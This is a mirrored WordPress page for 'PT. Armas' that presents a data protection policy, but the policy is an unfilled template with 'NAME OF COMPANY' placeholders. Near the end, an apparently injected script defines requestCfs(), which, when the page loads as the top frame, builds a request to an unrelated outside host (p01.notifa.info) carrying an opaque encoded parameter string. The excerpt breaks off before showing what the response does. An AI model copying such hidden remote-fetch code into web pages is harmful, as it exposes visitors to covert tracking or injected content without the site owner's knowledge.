...
<!-- Mirrored from waheedos.com/armas/data-protection-policy/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 04 Jul 2019 16:21:14 GMT -->
<!-- Added by HTTrack -->
...
<head>
	...
	<title>PT. Armas &nbsp;|&nbsp; Data Protection Policy</title>
	...
	<script type="text/javascript">
		window._wpemojiSettings = {
			...
			"svgExt": ".svg",
			"source": {
				"concatemoji": "http:\/\/waheedos.com\/armas\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.9.10"
			}
		};
		! function (a, b, c) {
			function d(a, b) {
	...
	<link rel="alternate" type="application/json+oembed"
		href="json/oembed/1.0/embed0047.json?url=http%3A%2F%2Fwaheedos.com%2Farmas%2Fdata-protection-policy%2F" />
	<link rel="alternate" type="text/xml+oembed"
		href="json/oembed/1.0/embed36b2?url=http%3A%2F%2Fwaheedos.com%2Farmas%2Fdata-protection-policy%2F&amp;format=xml" />
	<style type="text/css">
		.recentcomments a {
			display: inline !important;
			padding: 0 !important;
...
<body id="page-top">
				...
				<ul id="menu-top" class="nav navbar-nav">
					...
					<li id="menu-item-17"
						class="menu-item menu-item-type-post_type menu-item-object-page menu-item-17 nav-item"><a
							title="About" href="about.php" class="nav-link">About</a></li>
					<li id="menu-item-17"
						...
						<a title="About" href="artikel.php" class="nav-link">News</a></li>
					<li id="menu-item-17"
						class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-2 current_page_item active menu-item-17 nav-item">
	...
	<div class="page">
		<section id="data-protection-policy">
			<div class="section-content inner-padding">
				...
				<p>Effective date: January 24th, 2019</p>
				<p>NAME OF COMPANY (&#8220;us&#8221;, &#8220;we&#8221;, or &#8220;our&#8221;) operates the
					www.nameofcompany.com website (the &#8220;Service&#8221;).</p>
				<p>This page informs you of our policies regarding the collection, use, and disclosure of personal data
					when you use our Service and the choices you have associated with that data. Our Privacy Policy for
					NAME OF COMPANY is managed through <a
				...
				<p>We use your data to provide and improve the Service. By using the Service, you agree to the
					...
					Conditions, accessible from www.nameofcompany.com</p>
				...
				<h2></h2>
				<h2>Use of Data</h2>
				<p>NAME OF COMPANY uses the collected data for various purposes:</p>
				<ul>
				...
				<p>NAME OF COMPANY will take all steps reasonably necessary to ensure that your data is treated securely
				...
				<p>NAME OF COMPANY may disclose your Personal Data in the good faith belief that such action is
					necessary to:</p>
				<ul>
					<li>To comply with a legal obligation</li>
					<li>To protect and defend the rights or property of NAME OF COMPANY</li>
				...
				<ul>
					<li>By email: admin@nameofcompany.com</li>
					<li>By visiting this page on our website: www.nameofcompany.com</li>
				</ul>
			</div>
		</section>
	</div>
							...
							<div class="footer-navbar navbar-collapse akzidenz-condensed-regular text-center-mobile">
								<ul class="navbar-nav mr-auto">
									<li class="nav-item">
										...
										<a class="pr-3" href="about.php">About</a>
	...
	<script type='text/javascript'>
		...
		var wpcf7 = {
			"apiSettings": {
				"root": "http:\/\/waheedos.com\/armas\/wp-json\/contact-form-7\/v1",
		...
		if (self == top) {
			...
			function requestCfs() {
				...
				var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" +
					"4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2pPMqVxFWeZiM4P3SkU6P439agwhma98V6vvdjKQe7swlG3qwXKB1vq9PKYK%2fuCpoDVewxh8IY%2f5ZqbOoUUze54ooJaUyhYlKSYC4h6ec8iMssPyq5fuM0J3F7j73Ixlp2kOZH8JLEqjPhvDJCYeZEBi7sHotjKLI4lSzQO%2bAdfIEqT0yJQZfFZnWbk7GovEu%2fl%2fjIMHioQr03Byvc6sUPmcElzSwzqteXGnWQagEE%2fYZF9cwdeR2Ve1A3uy4SjcVtzJWTCxaPCOZ4qH4gJiMjs%2bxIvgz5rp5otl5eSFGW1JCJ%2bwBmqdbgG8P4l2Zqz%2bK7xarmAys0ZYkJXAralmPHHjqEAIEkicVyI5Y5no4Hyx1qy45zPUg6f7Swza93fqriwFt1X6Il7vcnP%2f8N9ED7SYMjpyrcg7wdDDgLbwYuQN4UWtUtiDAyzdegRrOwZhEeoHLPipmFEeQ%2fVu1Hj5BGA%3d%3d" +
...
<!-- Mirrored from waheedos.com/armas/data-protection-policy/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 04 Jul 2019 16:21:52 GMT -->
